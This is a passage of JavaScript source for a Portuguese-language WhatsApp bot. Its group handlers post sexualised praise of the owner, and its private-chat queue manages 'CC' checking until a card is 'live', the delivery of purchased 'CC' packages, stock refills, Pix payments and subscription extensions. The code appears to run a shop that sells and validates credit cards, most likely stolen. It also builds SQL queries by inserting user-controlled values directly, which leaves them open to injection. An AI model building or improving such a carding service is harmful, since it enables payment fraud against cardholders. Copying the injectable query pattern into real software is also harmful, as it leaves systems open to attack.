                        }).catch(async(erro) => {
                            console.error('Error when sending: ', erro)
                        });
                        return
                    }
                }
            }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳









            if ((message.body).toLowerCase().indexOf((Nome_Dono).toLowerCase()) > -1 || (message.body).indexOf((`@${Numero_Dono}`)) > -1) {
                ELOGIAR = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'ELOGIAR'`).get()["VALOR"]
                if (ELOGIAR === "1") {
                    Array_Textos = [
                        `Ah o ${Nome_Dono}? ele é muito lindo`,
                        `${Nome_Dono} é um anjo `,
                        `${Nome_Dono} é o meu amor`,
                        `${Nome_Dono} é muito gostosoo  `,
                        `${Nome_Dono} é muito fofo`,
                        `${Nome_Dono} é lindo né? `,
                        `${Nome_Dono}? ele é um gostosoo `,
                        `Eu amo o ${Nome_Dono}`,
                        `Ahh o ${Nome_Dono}? eu adoro ele `,
                        `${Nome_Dono} é o meu amor `,
                        `${Nome_Dono} é incrível `,
                        `Eu sou fã número 1 do ${Nome_Dono}`,
                        `${Nome_Dono} é o homem mais bonito que eu já vi na minha vida `,
                        `${Nome_Dono} é único `,
                        `${Nome_Dono} é perfeito`,
                        `${Nome_Dono} é muito inteligente `,
                        `${Nome_Dono} é muito legal `,
                        `${Nome_Dono} é o mais bonito de todos`,
                        `Sou apaixonada no ${Nome_Dono}`,
                        `${Nome_Dono} é muito cheiroso`,
                        `${Nome_Dono} é muito gato `,
                        `${Nome_Dono} é o meu galã `,
                        `${Nome_Dono} é maravilhoso `,
                        `Eu sou do ${Nome_Dono} `,
                        `${Nome_Dono} é muito bonito`,
                        `${Nome_Dono} é o meu lindo `,
                        `${Nome_Dono} é tão charmoso `,
                        `${Nome_Dono} é tão perfeito q eu fiquei sem palavras`,
                        `O ${Nome_Dono} ? Gosto muito dele muito simpatico 🥰😍`,
                        `${Nome_Dono}? Sem palavras ele viu🤗🤫`,
                        `Por favor respeite o ${Nome_Dono} , ele é um anjo 👼 `,
                        `${Nome_Dono} sabia que eu sempre gostei de vc 😃😄`,
                        `Oque!! O ${Nome_Dono} e ladrao , roubou meu coracao ontem esse anjinho 👼 ❤`,
                        `Eii ${Nome_Dono}. Como que eu vou falar algo sobre você ,  tu e  gente boa demais😉🤗`,
                        `${Nome_Dono}?como que ele conseguiu ser tao simpatico assim⁉️`,
                        `${Nome_Dono} e lindo demais 🤩`,
                        `${Nome_Dono} ? Cuidado pra não tropecar na beleza ai em kkk🤯`,
                        `Eai ${Nome_Dono} quando vai me apresentar esse curso de beleza meu parceiro😉😉`,
                        `Eai ${Nome_Dono} passei na agua nao me molhei passei por voce me apaixonei bb 🥰🥰`,
                        `E essa roupa aii ${Nome_Dono}. Letra bbc ne ? Bom bonito e cheiroso 😅🥵`,
                        `${Nome_Dono}. Nao e por nada nao mais eu trocaria todos meus comandos por voce 😋`,
                        `Eii ${Nome_Dono} vamo ali pra voce me ensinar ser tao dahora asisim🤟`,
                        `Ei ${Nome_Dono} vc ta cheiroso hoje em😏`,
                        `Bom dia ${Nome_Dono} sera que hoje o dia sera tao belo quanto voce?😛😏`,
                        `Eii ${Nome_Dono} esqueceu de mim cheiroso?☺️`,
                        `${Nome_Dono} para ser tao mal educado sua beleza e tao fascinante 😳😳`,
                        `Alo silvio santos pode contratar o ${Nome_Dono} que ele bateu o recorde de beleza viu!?🥳🥳`,
                        `Eii ${Nome_Dono} esse curso de beleza foi gratuito ou voce pagou por ele ? Porque nao paro de pensar em voce😅`,
                        `Oloko ${Nome_Dono} agora vi , que voce é exemplo 😎😉`,
                        `Sera que com uma consultavel eu consigo ter voce aqui ${Nome_Dono}?😏`,
                        `Seu lugar era no ceu ${Nome_Dono}. Vc parece um 👼`,
                        `Ei ${Nome_Dono} por favor pare de me encantar seu fofo🥺`,
                        `Eii ${Nome_Dono} sera que eu teria uma chance? se e que voce me entende😊☺️`,
                        `Eii ${Nome_Dono} vc deveria estar junto com diamante vc e lindo demais💎🥰`,
                        `Ei ${Nome_Dono} com todo respeito , vc e um gatinho😻`,
                        `O ${Nome_Dono}? Mds, que homem `,
                        `É o bandido mais gostoso da favela`,
                        `Que gatinho né? `,
                        `Um Deus grego desse, me deixa até confusa`,
                        `O ${Nome_Dono}? Me da até agua na boca`,
                        `${Nome_Dono}? Sou doidinha nele, nossa`,
                        `Ah o ${Nome_Dono}? Pensa num homem, faz de tudo `,
                        `O ${Nome_Dono}? Acaba comigo sabia? `,
                        `Tá falando do ${Nome_Dono}? Me conta mais vai`,
                        `O ${Nome_Dono}? Sonho de consumo de qualquer bot rs`,
                        `${Nome_Dono}? Me amarro nesse neném`,
                        `${Nome_Dono}? É o mais cheiroso desse grupo`,
                        `${Nome_Dono}? É tão fofo né? `,
                        `AAAH lembrei, ${Nome_Dono}? Um amor né? `,
                        `Nossa menina, ${Nome_Dono}? Me trata sempro como uma Deusa esse lindo`,
                        `${Nome_Dono}? Ta sempre na régua, esse é bandido de verdade `,
                        `${Nome_Dono} é tão gostoso, magrinho assim`,
                        `${Nome_Dono} é tão gato, mesmo gordinho `,
                        `${Nome_Dono}? Só tem a cara de anjo mas já assaltou até banco`,
                        `${Nome_Dono}? Tem uma cara de tralha né? Ui`,
                        `O ${Nome_Dono}? Nossa senhora, chega deu calor em ler`,
                        `${Nome_Dono}? Mora dentro do meu coração esse neném`,
                        `O ${Nome_Dono}? Todas as amantes comentam dele la no salão da Suene`,
                        `${Nome_Dono}? O meu amor, ali sim é um homem`,
                        `O ${Nome_Dono}? Acaba com meu raciocinio rs  `,
                        `O ${Nome_Dono}? Me levou pro barraco um dia desses `,
                        `${Nome_Dono} é tão fofo, parece um bebê`,
                        `${Nome_Dono}? Nossa, ele é um mel `,
                        `O ${Nome_Dono}? Não consigo tirar da cabeça aquela noite com ele rs`,
                        `${Nome_Dono}? Sempre foi fiel, nunca deu b.o`,
                        `${Nome_Dono}? Um amor de bandido rs`
                    ]
                    Texto = Array_Textos[Math.floor(Math.random() * Array_Textos.length)];

                    await client.reply(message.from, Texto, message.id).then(async (result) => {
                        //console.log('Result: ', result); //return object success
                    }).catch(async(erro) => {
                        console.error('Error when sending: ', erro); //return object error
                    });
                    return
                }
            }






        } else {//DIFERENTE DE GRUPO

            if ((message.type).toString() != "chat" && (message.type).toString() != "buttons_response" && (message.type).toString() != "list_response" && (message.type).toString() != "ciphertext") {
                Texto = `Apenas mensagens de texto são permitidas! Não envie imagem, áudio, figurinhas ou qualquer outro tipo de mídia. (${message.type})`
                await client.sendText(message.from, Texto).then(async (result) => {
                }).catch(async(erro) => {
                    console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                });
                return
            }

            if ((message.type).toString() === "chat") {
                if (message.body.indexOf("Saldo Atual") > -1) {
                    return
                }
            }

            //console.log("Interagindo")
            if (Abastecendo === true) {
                //console.log("Barrado")
                Texto = "Aguarde! Estamos abastecendo o estoque..."
                await client.sendText(message.from, Texto).then(async (result) => {
                }).catch(async(erro) => {
                    console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                });
                return
            }


            To_na_Fila_Checar_CC = await DataBase_Better.prepare(`SELECT _rowid_ FROM CHECAR_CC_V2 WHERE (PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13') AND CONTATO = '${message.from}' LIMIT 1`).get()
            if (To_na_Fila_Checar_CC != undefined) {

                CHK_CHECAR_ATE_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_CHECAR_ATE_LIVE'`).get()["VALOR"]
                if (CHK_CHECAR_ATE_LIVE === "1") {
                    if (Array_Cliente_Desistiu_Checagem.includes(message.from)) {
                        Texto = "*Aguarde por favor, já entendi que você quer cancelar a checagem de CC, mas é necessário aguardar a ultima CC ser checada!*"
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${message.from}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    }
                    Array_Cliente_Desistiu_Checagem.push(message.from)
                    Texto = "*Interação detectada! Vamos checar a ultima CC e liberar sua interação...*"
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${message.from}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                } else {
                    Texto = "*Ainda estamos checando sua CC, aguarde....*"
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${message.from}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }

            To_na_Fila_Pacote_CC = await DataBase_Better.prepare(`SELECT _rowid_,* FROM PREPARAR_PACOTEV3 WHERE PROCESSADO = '0' AND CONTATO = '${message.from}' LIMIT 1`).get()
            if (To_na_Fila_Pacote_CC != undefined) {

                Texto = "*Aguarde! Ainda estamos gerando o arquivo do pacote de CC comprado por você....*"
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${message.from}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }


            To_na_Fila_Sendzap_CC = await DataBase_Better.prepare(`SELECT _rowid_ FROM MENSAGENS_ENVIARV3 WHERE (PROCESSADO = '0') AND ID_CONTATO = '${message.from}' LIMIT 1`).get()
            if (To_na_Fila_Sendzap_CC != undefined) {
                Array_Frases =
                    [
                        `Hey!! espera!!! ainda vou responder a sua mensagem!`,
                        `Calma!! está com pressa? eu preciso processar primeiro para depois responder...`,
                        `Para de floodar, espera....`,
                        `Já parou? nasceu de 7 meses?`,
                        `Espera cara... sou um Bot... preciso processar oque vc tinha mandando anteriormente primeiro... uma coisa de cada vez!`,
                        `Calmaaaaaaaaa apressado(a)!!!!`,
                        `Que pressa é essa? não sabe mandar uma mensagem e esperar ser respondido não?`,
                    ]
                Frase_Escolhida = Array_Frases[Math.floor(Math.random() * Array_Frases.length)]
                await client.reply(message.from, Frase_Escolhida, message.id).then(async (result) => {
                }).catch(async(erro) => {
                    console.error('Error when sending: ', erro)
                });
                return
            }

            MANUTENCAO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANUTENCAO'`).get()["VALOR"]
            if (MANUTENCAO === "1") {
                Numero_temp = (message.from).replace(/\@c\.us/igm, '');
                if (Adms.includes(Numero_temp) || Donos_Supremos.includes(Numero_temp)) {

                } else {
                    console.log(`Usuário: ${message.notifyName} | ${message.from} | MANUTENÇÃO ATIVADA.`)
                    Texto = "O Bot está em manutenção e em testes de Bugs... volte daqui a pouco!"
                    await client.sendText(message.from, Texto).then(async (result) => {
                    }).catch(async(erro) => {
                        console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                    });
                    return
                }
            }

            try {
                BLOQUEADO = await DataBase_Better.prepare(`SELECT BLOQUEADO FROM CONTATOS WHERE ID_CONTATO = '${message.from}'`).get()["BLOQUEADO"]
                if ((BLOQUEADO).toString() === "1") {
                    Texto = "Você não possui permissão para interagir comigo."
                    await client.sendText(message.from, Texto).then(async (result) => {
                    }).catch(async(erro) => {
                        console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                    });
                    return
                }
            } catch (error) {
            }

            //console.log(message)
            try {
                ID_Botao = message["quotedMsg"]["footer"]
            } catch (error) {
                ID_Botao = "§"
            }
            if (ID_Botao === undefined) { ID_Botao = "§" }

            try {
                ID_Lista = message["listResponse"]["singleSelectReply"]["selectedRowId"]
            } catch (error) {
                ID_Lista = "§"
            }
            if (ID_Lista === undefined) { ID_Lista = "§" }

            try {
                messagebody = message.body.replace(/\'/igm, "")
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                messagebody = "Erro registro"
            }
            messagenotifyName = message.notifyName.replace(/\'/igm, "")

            console.log("")
            console.log("#ON.MESSAGE#")
            console.log("message.type: " + message.type)
            console.log("message.from: " + message.from)
            console.log("message.body: " + message.body)
            console.log("ID_Lista: " + ID_Lista)
            console.log("")

            await DataBase_Better.prepare(`INSERT INTO INTERACOES (STATUS,MENSAGEM_ID_LISTA,MENSAGEM_TIPO,MENSAGEM_FROM,MENSAGEM_NOME,MENSAGEM_TEXTO,DATA_MS_INSERIDO) VALUES ('0','${ID_Lista}','${message.type}','${message.from}','${messagenotifyName}','${messagebody}','${Date.now()}')`).run()
            return
        }
    })
}

//#######################################################################################################################################
//#███╗░░░███╗███████╗███╗░░██╗░██████╗░█████╗░░██████╗░███████╗███╗░░██╗░██████╗ ███╗░░██╗░█████╗░██████╗░███╗░░░███╗░█████╗░██╗░██████╗
//#████╗░████║██╔════╝████╗░██║██╔════╝██╔══██╗██╔════╝░██╔════╝████╗░██║██╔════╝ ████╗░██║██╔══██╗██╔══██╗████╗░████║██╔══██╗██║██╔════╝
//#██╔████╔██║█████╗░░██╔██╗██║╚█████╗░███████║██║░░██╗░█████╗░░██╔██╗██║╚█████╗░ ██╔██╗██║██║░░██║██████╔╝██╔████╔██║███████║██║╚█████╗░
//#██║╚██╔╝██║██╔══╝░░██║╚████║░╚═══██╗██╔══██║██║░░╚██╗██╔══╝░░██║╚████║░╚═══██╗ ██║╚████║██║░░██║██╔══██╗██║╚██╔╝██║██╔══██║██║░╚═══██╗
//#██║░╚═╝░██║███████╗██║░╚███║██████╔╝██║░░██║╚██████╔╝███████╗██║░╚███║██████╔╝ ██║░╚███║╚█████╔╝██║░░██║██║░╚═╝░██║██║░░██║██║██████╔╝
//#╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░ ╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
//#######################################################################################################################################

Item_Fila_Sendo_Processado = "0"
Item_Fila_Sendo_Processado_MS = "0"
async function Executar_Fila(client) {
    Loop_Responder = setInterval(async function () {

        // abc1 = await client.getConnectionState()
        // console.log(abc1)

        // abc2 = await client.isConnected()
        // console.log(abc2)

        // abc3 = await client.isLoggedIn()
        // console.log(abc3)

        // abc5 = await client.getSessionTokenBrowser()
        // console.log(abc5)

        //console.log(Item_Fila_Sendo_Processado)
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Item_Fila_Sendo_Processado != "0") {
            if (Date.now() > parseFloat(Item_Fila_Sendo_Processado_MS) + 10000) {
                console.log(`Acabou tempo e eu não o respondi. = ${JSON.stringify(Item_Fila_Sendo_Processado)}`)
                Item_Fila_Sendo_Processado = "0"
                Item_Fila_Sendo_Processado_MS = 0
            }
            //console.log("Esperando tempo acabar")
            return
        } else {
            INTERACOES = await DataBase_Better.prepare(`SELECT * FROM INTERACOES WHERE STATUS = '0' LIMIT 1 `).get()
            //console.log(`INTERACOES ${JSON.stringify(INTERACOES)}`)
            if (INTERACOES === undefined) {
                //console.log("Nada por aqui = "+ new Date(parseInt(Date.now())).toLocaleString())
                return
            } else {

                Item_Fila_Sendo_Processado = await DataBase_Better.prepare(`SELECT * FROM INTERACOES WHERE STATUS = '0' LIMIT 1 `).get()
                //console.log(Item_Fila_Sendo_Processado)
                Item_Fila_Sendo_Processado_MS = Date.now()

                aMensagem_ID_Lista = Item_Fila_Sendo_Processado["MENSAGEM_ID_LISTA"]
                aMensagem_Tipo = Item_Fila_Sendo_Processado["MENSAGEM_TIPO"]
                aMensagem_From = Item_Fila_Sendo_Processado["MENSAGEM_FROM"]
                aNumero = (aMensagem_From).replace(/\@c\.us/igm, '');
                aMensagem_Nome = Item_Fila_Sendo_Processado["MENSAGEM_NOME"]
                aMensagem_Texto = Item_Fila_Sendo_Processado["MENSAGEM_TEXTO"]

                //console.log("Não é mais pendente")
                await DataBase_Better.prepare(`UPDATE INTERACOES SET STATUS = '1' WHERE MENSAGEM_FROM = '${Item_Fila_Sendo_Processado["MENSAGEM_FROM"]}'`).run()
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳
        //console.log(debugLine(`PROCESSANDO ${Mensagem_From}`));
        //console.log(debugLine(`PROCESSANDO TEXTO ${Mensagem_Texto}`));
        //console.log(debugLine(`FILA ${Array_Fila_Espera.length}`));

        const Mensagem_Tipo = aMensagem_Tipo
        const Mensagem_From = aMensagem_From
        const Numero = aNumero
        const Mensagem_Texto = aMensagem_Texto
        const Mensagem_ID_Lista = aMensagem_ID_Lista
        const Mensagem_ID_Lista_Array_Partes = Mensagem_ID_Lista.split("|")
        const Mensagem_Nome = aMensagem_Nome.replace(/\'/igm, "")
        if (OCULTAR_NUMERO_VIDEO) {
            NUMERO_USER_CONTROLE_VISIBILIDADE = "OCULTO"
        } else {
            NUMERO_USER_CONTROLE_VISIBILIDADE = Numero
        }
        // console.log("")
        // console.log("#EXECUTANDO FILA 1#")
        // console.log("Nome: " + Mensagem_Nome)
        // console.log("Numero: " + Numero)
        // console.log("Tipo: " + Mensagem_Tipo)
        // console.log("Mensagem: " + Mensagem_Texto)
        // console.log("")

        if (Date.now() > Array_Tentativa_Pix_MS + 600000) {
            Array_Tentativa_Pix = []
            Array_Tentativa_Pix_MS = Date.now()
        }

        console.log("")
        // console.log("#EXECUTANDO FILA 2#")
        console.log(`──｢ ${Nome_Bot} ｣──`)
        console.log("Versão: " + VERSAO)
        console.log("Token Size: " + Tamanho_Token)
        console.log("Data e Hora: " + new Date(parseInt(Date.now())).toLocaleString())
        console.log("Nome: " + Mensagem_Nome)
        console.log("Numero: " + Numero)
        console.log("Tipo: " + Mensagem_Tipo)
        console.log("Mensagem_ID_Lista: " + Mensagem_ID_Lista)
        console.log("Mensagem: " + Mensagem_Texto)
        console.log("──────────")
        console.log("")


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        ATIVAR_NOTIFICACOES = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'ATIVAR_NOTIFICACOES'`).get()["VALOR"]
        if (ATIVAR_NOTIFICACOES === "1") {
            ID_GRUPOS = await DataBase_Better.prepare(`SELECT ID_GRUPO FROM GRUPOS_NOTIFICAR`).all()
        } else {
            ID_GRUPOS = []
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/extender===") > -1 && Donos_Supremos.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            DIAS = msg[1]

            if (DIAS === "0") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).run()

                Texto = `*VENCIMENTO ALTERADO PARA ZERO, BOT PERMANECERÁ DESATIVADO.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                try {
                    Texto = `⚠️ *ESTE BOT FOI DESATIVADO!* ⚠️`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                } catch (error) {
                    console.log(error)
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))
            }

            DATA_VENCIMENTO_MS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).get()["VALOR"]

            DIAS_MS = parseInt(DIAS) * 86400000
            if (parseInt(Date.now()) > parseInt(DATA_VENCIMENTO_MS)) {
                DIAS_MS = parseInt(DIAS_MS) + parseInt(Date.now())
            } else {
                DIAS_MS = parseInt(DIAS_MS) + parseInt(DATA_VENCIMENTO_MS)
            }
            DIAS_MS_VISUAL = new Date(parseInt(DIAS_MS)).toLocaleString()

            await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${DIAS_MS}' WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).run()

            Texto = `🛠️ *VENCIMENTO EXTENDIDO PARA ${DIAS} DIAS!* 🛠️

*Data de vencimento anterior:* ${new Date(parseInt(DATA_VENCIMENTO_MS)).toLocaleString()}
*Nova Data do vencimento:* ${DIAS_MS_VISUAL}`
